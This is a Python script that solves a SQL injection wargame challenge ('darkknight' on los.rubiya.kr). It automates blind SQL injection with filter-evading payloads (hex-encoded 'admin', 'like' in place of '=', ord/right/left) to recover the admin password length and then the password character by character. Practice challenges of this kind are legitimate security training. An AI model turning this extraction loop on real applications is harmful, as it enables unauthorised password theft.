import string
import requests

url = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php"
params = {'no' : None}
cookies = {'PHPSESSID' : '1t87momi7f10m7tl6kkv6t0lob'}

# 비밀번호 구하기
for i in range(1,30):
    payload = "1 or id like 0x61646d696e and length(pw) like {}".format(i)
    params['no'] = payload
    response = requests.get(url,params=params,cookies=cookies)
    print(payload)
    if("Hello admin" in response.text):
        print(response.text)
        print("find the pw length : ",i)
        break

flag = ''
for i in range(1,9):
    for j in string.printable:
        payload='1 or id like 0x61646d696e and ord(right(left(pw,{}),1)) like {}'.format(i,ord(j))
        params['no'] = payload
        response = requests.get(url,params=params,cookies=cookies)
        if("Hello admin" in response.text):
            flag += j
            print("find the flag",flag)
            break

